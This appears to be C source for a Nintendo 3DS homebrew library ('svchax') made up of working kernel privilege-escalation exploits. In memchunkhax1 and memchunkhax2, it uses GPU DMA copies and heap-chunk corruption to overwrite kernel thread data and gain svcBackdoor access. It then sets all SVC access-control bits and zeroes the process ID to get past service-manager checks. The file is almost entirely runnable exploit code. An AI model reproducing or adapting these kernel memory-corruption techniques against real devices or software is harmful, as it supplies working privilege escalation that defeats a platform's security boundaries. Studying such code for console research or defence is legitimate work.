#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include "svchax.h"

extern void* __service_ptr;

u32 __ctr_svchax = 0;
u32 __ctr_svchax_srv = 0;

typedef u32(*backdoor_fn)(u32* args);

static u32* backdoor_args;
static u32  backdoor_rv;
static backdoor_fn backdoor_entry;

static s32 backdoor_wrap(void)
{
   __asm__ volatile("cpsid aif \n\t");
   backdoor_rv = backdoor_entry(backdoor_args);
   return 0;
}

static u32 svc_7b(backdoor_fn entry, u32* args)
{
   backdoor_args = args;
   backdoor_entry = entry;

   svcBackdoor(backdoor_wrap);
   return backdoor_rv;
}

static u32 k_read_kaddr(u32* kaddr)
{
   return *kaddr;
}

static u32 read_kaddr(u32 kaddr)
{
   return svc_7b(k_read_kaddr, (u32*)kaddr);
}

static u32 k_write_kaddr(u32* args)
{
   *(u32*)args[0] = args[1];
   return 0;
}

static void write_kaddr(u32 kaddr, u32 val)
{
   u32 args[] = {kaddr, val};
   svc_7b(k_write_kaddr, args);
}

static __attribute__((naked))
Result GetResourceLimit(Handle* resourceLimit, Handle process)
{
   __asm__(
      "str r0, [sp, #-4]! \n\t"
      "svc 0x38 \n\t"
      "ldr r2, [sp], #4 \n\t"
      "str r1, [r2] \n\t"
      "bx  lr \n\t");
   return 0;
}

static __attribute__((naked))
Result GetResourceLimitLimitValues(s64* values, Handle resourceLimit, u32* names, s32 nameCount)
{
   __asm__(
      "svc 0x39 \n\t"
      "bx  lr \n\t");
   return 0;
}

static __attribute__((naked))
Result GetResourceLimitCurrentValues(s64* values, Handle resourceLimit, u32* names, s32 nameCount)
{
   __asm__(
      "svc 0x3A \n\t"
      "bx  lr \n\t");
   return 0;
}

__attribute__((naked))
static u32* get_thread_page(void)
{
   __asm__ volatile(
      "sub r0, sp, #8 \n\t"
      "mov r1, #1 \n\t"
      "mov r2, #0 \n\t"
      "svc	0x2A \n\t"
      "mov r0, r1, LSR#12 \n\t"
      "mov r0, r0, LSL#12 \n\t"
      "bx lr \n\t");
   return 0;
}


typedef struct
{
   u32* stack_top;
   volatile bool has_7B_access;
   Handle handle;
   bool keep;
} thread_vars_t;

typedef struct
{

   u32* main_thread_page;
   u32 old_cpu_time_limit;
   u8 isNew3DS;

   Handle arbiter;
   volatile u32 alloc_address;
   volatile u32 alloc_size;
   u8* flush_buffer;

   Handle dummy_threads_lock;
   Handle target_threads_lock;
   Handle main_thread_lock;
   u32* thread_page_va;
   u32 thread_page_kva;

   u32 threads_limit;
   Handle alloc_thread;
   Handle poll_thread;
   thread_vars_t threads[0x20];
} memchunkhax2_vars_t;
static memchunkhax2_vars_t mch2;

static void alloc_thread_entry(void)
{
   u32 tmp;

   svcControlMemory(&tmp, mch2.alloc_address, 0x0, mch2.alloc_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
   svcExitThread();
}

static void dummy_thread_entry(Handle lock)
{
   svcWaitSynchronization(lock, U64_MAX);
   svcExitThread();
}

static void check_tls_thread_entry(bool* keep)
{
   *keep = !((u32)getThreadLocalStorage() & 0xFFF);
   svcExitThread();
}

static u32 k_grant_7B_access(u32* thread_page)
{
   thread_page[0xF44 >> 2] = 0x08000000;
   return 0;
}

static void target_thread_entry(int id)
{
   svcSignalEvent(mch2.main_thread_lock);
   svcWaitSynchronization(mch2.target_threads_lock, U64_MAX);

   if (mch2.threads[id].has_7B_access)
      svc_7b(k_grant_7B_access, mch2.main_thread_page);

   svcExitThread();
}

static u32 get_first_free_basemem_page(bool isNew3DS)
{
   s64 v1, v2;
   svcGetSystemInfo(&v1, 2, 0);
   svcGetSystemInfo(&v2, 0, 3);

   return 0xE006C000 + (isNew3DS ? 0x10001000 : 0x08000000) + v1 - v2
          - (*(u32*)0x1FF80000 <= 0x02310000 ? (isNew3DS ? 0x2000 : 0x1000) : 0x0);

}

static u32 get_threads_limit(void)
{
   Handle resource_limit_handle;
   s64 thread_limit_current;
   s64 thread_limit_max;
   u32 thread_limit_name = 2;

   GetResourceLimit(&resource_limit_handle, 0xFFFF8001);
   GetResourceLimitCurrentValues(&thread_limit_current, resource_limit_handle, &thread_limit_name, 1);
   GetResourceLimitLimitValues(&thread_limit_max, resource_limit_handle, &thread_limit_name, 1);
   svcCloseHandle(resource_limit_handle);

   if (thread_limit_max > 0x20)
      thread_limit_max = 0x20;

   thread_limit_max &= ~0x7;

   return thread_limit_max - thread_limit_current;
}

static void do_memchunkhax2(void)
{
   static u8 flush_buffer[0x10000];
   static u8 thread_stacks[0x20000];

   int i;
   u32 tmp;

   memset(&mch2, 0x00, sizeof(mch2));

   mch2.flush_buffer = flush_buffer;
   mch2.main_thread_page = get_thread_page();
   mch2.threads_limit = get_threads_limit();

   for (i = 0; i < 0x20; i++)
      mch2.threads[i].stack_top = (u32*)((u32)thread_stacks + ((i + 1) << 12));

   aptOpenSession();
   APT_CheckNew3DS(&mch2.isNew3DS);
   APT_GetAppCpuTimeLimit(&mch2.old_cpu_time_limit);
   APT_SetAppCpuTimeLimit(5);
   aptCloseSession();

   for (i = 0; i < mch2.threads_limit; i++)
   {
      svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)check_tls_thread_entry, (u32)&mch2.threads[i].keep,
                      mch2.threads[i].stack_top, 0x18, 0);
      svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);
   }

   for (i = 0; i < mch2.threads_limit; i++)
      if (!mch2.threads[i].keep)
         svcCloseHandle(mch2.threads[i].handle);

   svcCreateEvent(&mch2.dummy_threads_lock, 1);
   svcClearEvent(mch2.dummy_threads_lock);

   for (i = 0; i < mch2.threads_limit; i++)
      if (!mch2.threads[i].keep)
         svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)dummy_thread_entry, mch2.dummy_threads_lock,
                         mch2.threads[i].stack_top, 0x3F - i, 0);

   svcSignalEvent(mch2.dummy_threads_lock);

   for (i = mch2.threads_limit - 1; i >= 0; i--)
      if (!mch2.threads[i].keep)
      {
         svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);
         svcCloseHandle(mch2.threads[i].handle);
         mch2.threads[i].handle = 0;
      }

   svcCloseHandle(mch2.dummy_threads_lock);

   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);

   u32 fragmented_address = 0;

   mch2.arbiter = __sync_get_arbiter();

   u32 linear_buffer;
   svcControlMemory(&linear_buffer, 0, 0, 0x1000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   u32 linear_size = 0xF000;
   u32 skip_pages = 2;
   mch2.alloc_size = ((((linear_size - (skip_pages << 12)) + 0x1000) >> 13) << 12);
   u32 mem_free = osGetMemRegionFree(MEMREGION_APPLICATION);

   u32 fragmented_size = mem_free - linear_size;
   extern u32 __ctru_heap;
   extern u32 __ctru_heap_size;
   fragmented_address = __ctru_heap + __ctru_heap_size;
   u32 linear_address;
   mch2.alloc_address = fragmented_address + fragmented_size;
   gfxFlushBuffers();

   svcControlMemory(&linear_address, 0x0, 0x0, linear_size, MEMOP_ALLOC_LINEAR,
                    MEMPERM_READ | MEMPERM_WRITE);

   gfxFlushBuffers();

   if (fragmented_size)
      svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_ALLOC,
                       MEMPERM_READ | MEMPERM_WRITE);

   if (skip_pages)
      svcControlMemory(&tmp, (u32)linear_address, 0x0, (skip_pages << 12), MEMOP_FREE, MEMPERM_DONTCARE);

   for (i = skip_pages; i < (linear_size >> 12) ; i += 2)
      svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);

   u32 alloc_address_kaddr = osConvertVirtToPhys((void*)linear_address) + 0xC0000000;

   tmp = alloc_address_kaddr;

   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);

   mch2.thread_page_kva = get_first_free_basemem_page(mch2.isNew3DS) - 0x10000; // skip down 16 pages
   ((u32*)linear_buffer)[0] = 1;
   ((u32*)linear_buffer)[1] = mch2.thread_page_kva;
   ((u32*)linear_buffer)[2] = alloc_address_kaddr + (((mch2.alloc_size >> 12) - 3) << 13) + (skip_pages << 12);

   u32 dst_memchunk = linear_address + (((mch2.alloc_size >> 12) - 2) << 13) + (skip_pages << 12);
   gfxFlushBuffers();

   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   GSPGPU_InvalidateDataCache((void*)dst_memchunk, 16);
   GSPGPU_FlushDataCache((void*)linear_buffer, 16);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   extern Handle gspEvents[GSPGPU_EVENT_MAX];
   svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);

   svcCreateThread(&mch2.alloc_thread, (ThreadFunc)alloc_thread_entry, (u32)&mch2, mch2.threads[0x1F].stack_top,
                   0x3F, 1);

   while ((u32) svcArbitrateAddress(mch2.arbiter, mch2.alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0,
                                    0) == 0xD9001814);

   GX_TextureCopy((void*)linear_buffer, 0, (void*)dst_memchunk, 0, 16, 8);
   svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);

   svcWaitSynchronization(mch2.alloc_thread, U64_MAX);
   svcCloseHandle(mch2.alloc_thread);

   u32* mapped_page = (u32*)(mch2.alloc_address + mch2.alloc_size - 0x1000);

   volatile u32* thread_ACL = &mapped_page[0xF38 >> 2];

   svcCreateEvent(&mch2.main_thread_lock, 0);
   svcCreateEvent(&mch2.target_threads_lock, 1);
   svcClearEvent(mch2.target_threads_lock);

   for (i = 0; i < mch2.threads_limit; i++)
   {
      if (mch2.threads[i].keep)
         continue;

      thread_ACL[0] = 0;
      GSPGPU_FlushDataCache((void*)thread_ACL, 16);
      GSPGPU_InvalidateDataCache((void*)thread_ACL, 16);

      mch2.threads[i].has_7B_access = false;
      svcClearEvent(mch2.main_thread_lock);
      svcCreateThread(&mch2.threads[i].handle, (ThreadFunc)target_thread_entry, i,
                      mch2.threads[i].stack_top, 0x18, 0);
      svcWaitSynchronization(mch2.main_thread_lock, U64_MAX);

      if (thread_ACL[0])
      {
         thread_ACL[3] = 0x08000000;
         GSPGPU_FlushDataCache((void*)thread_ACL, 16);
         GSPGPU_InvalidateDataCache((void*)thread_ACL, 16);
         mch2.threads[i].has_7B_access = true;
         break;
      }

   }

   svcSignalEvent(mch2.target_threads_lock);

   for (i = 0; i < mch2.threads_limit; i++)
   {
      if (!mch2.threads[i].handle)
         continue;

      if (!mch2.threads[i].keep)
         svcWaitSynchronization(mch2.threads[i].handle, U64_MAX);

      svcCloseHandle(mch2.threads[i].handle);
   }

   svcCloseHandle(mch2.target_threads_lock);
   svcCloseHandle(mch2.main_thread_lock);

   svcControlMemory(&tmp, mch2.alloc_address, 0, mch2.alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
   write_kaddr(alloc_address_kaddr + linear_size - 0x3000 + 0x4, alloc_address_kaddr + linear_size - 0x1000);
   svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_FREE, MEMPERM_DONTCARE);

   for (i = 1 + skip_pages; i < (linear_size >> 12) ; i += 2)
      svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);

   svcControlMemory(&tmp, linear_buffer, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);

   aptOpenSession();
   APT_SetAppCpuTimeLimit(mch2.old_cpu_time_limit);
   aptCloseSession();
}


static void gspwn(u32 dst, u32 src, u32 size, u8* flush_buffer)
{
   extern Handle gspEvents[GSPGPU_EVENT_MAX];

   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
   GSPGPU_InvalidateDataCache((void*)dst, size);
   GSPGPU_FlushDataCache((void*)src, size);
   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);

   svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);
   GX_TextureCopy((void*)src, 0, (void*)dst, 0, size, 8);
   svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);

   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
}

/* pseudo-code:
 * if(val2)
 * {
 *    *(u32*)val1 = val2;
 *    *(u32*)(val2 + 8) = (val1 - 4);
 * }
 * else
 *    *(u32*)val1 = 0x0;
 */

// X-X--X-X
// X-XXXX-X

static void memchunkhax1_write_pair(u32 val1, u32 val2)
{
   u32 linear_buffer;
   u8* flush_buffer;
   u32 tmp;

   u32* next_ptr3;
   u32* prev_ptr3;

   u32* next_ptr1;
   u32* prev_ptr6;

   svcControlMemory(&linear_buffer, 0, 0, 0x10000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   flush_buffer = (u8*)(linear_buffer + 0x8000);

   svcControlMemory(&tmp, linear_buffer + 0x1000, 0, 0x1000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x3000, 0, 0x2000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x6000, 0, 0x1000, MEMOP_FREE, 0);

   next_ptr1 = (u32*)(linear_buffer + 0x0004);
   gspwn(linear_buffer + 0x0000, linear_buffer + 0x1000, 16, flush_buffer);

   next_ptr3 = (u32*)(linear_buffer + 0x2004);
   prev_ptr3 = (u32*)(linear_buffer + 0x2008);
   gspwn(linear_buffer + 0x2000, linear_buffer + 0x3000, 16, flush_buffer);

   prev_ptr6 = (u32*)(linear_buffer + 0x5008);
   gspwn(linear_buffer + 0x5000, linear_buffer + 0x6000, 16, flush_buffer);

   *next_ptr1 = *next_ptr3;
   *prev_ptr6 = *prev_ptr3;

   *prev_ptr3 = val1 - 4;
   *next_ptr3 = val2;
   gspwn(linear_buffer + 0x3000, linear_buffer + 0x2000, 16, flush_buffer);
   svcControlMemory(&tmp, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   gspwn(linear_buffer + 0x1000, linear_buffer + 0x0000, 16, flush_buffer);
   gspwn(linear_buffer + 0x6000, linear_buffer + 0x5000, 16, flush_buffer);

   svcControlMemory(&tmp, linear_buffer + 0x0000, 0, 0x1000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x2000, 0, 0x4000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x7000, 0, 0x9000, MEMOP_FREE, 0);

}

static void do_memchunkhax1(void)
{
   u32 saved_vram_value = *(u32*)0x1F000008;
   memchunkhax1_write_pair((u32)get_thread_page() + 0xF44, 0x1F000000);
   write_kaddr(0x1F000008, saved_vram_value);
}

static void k_enable_all_svcs(int isNew3DS)
{
   u32* thread_ACL = *(*(u32***)0xFFFF9000 + 0x22) - 0x6;
   u32* process_ACL = *(u32**)0xFFFF9004 + (isNew3DS ? 0x24 : 0x22);

   memset(thread_ACL, 0xFF, 0x10);
   memset(process_ACL, 0xFF, 0x10);
}

Result svchax_init(bool patch_srv)
{
   u8 isNew3DS;
   aptOpenSession();
   APT_CheckNew3DS(&isNew3DS);
   aptCloseSession();

   u32 kver = *(u32*)0x1FF80000;

   if (!__ctr_svchax)
   {
      if (__service_ptr)
      {
         if (kver > 0x02320B00)
            return -1;
         else if (kver > 0x022E0000)
            do_memchunkhax2();
         else
            do_memchunkhax1();
      }

      svc_7b((backdoor_fn)k_enable_all_svcs, (u32*)(int)isNew3DS);

      __ctr_svchax = 1;
   }

   if (patch_srv && !__ctr_svchax_srv)
   {
      u32 PID_kaddr = read_kaddr(0xFFFF9004) + (isNew3DS ? 0xBC : (kver > 0x02280000) ? 0xB4 : 0xAC);
      u32 old_PID = read_kaddr(PID_kaddr);
      write_kaddr(PID_kaddr, 0);
      srvExit();
      srvInit();
      write_kaddr(PID_kaddr, old_PID);

      __ctr_svchax_srv = 1;
   }

   return 0;
}
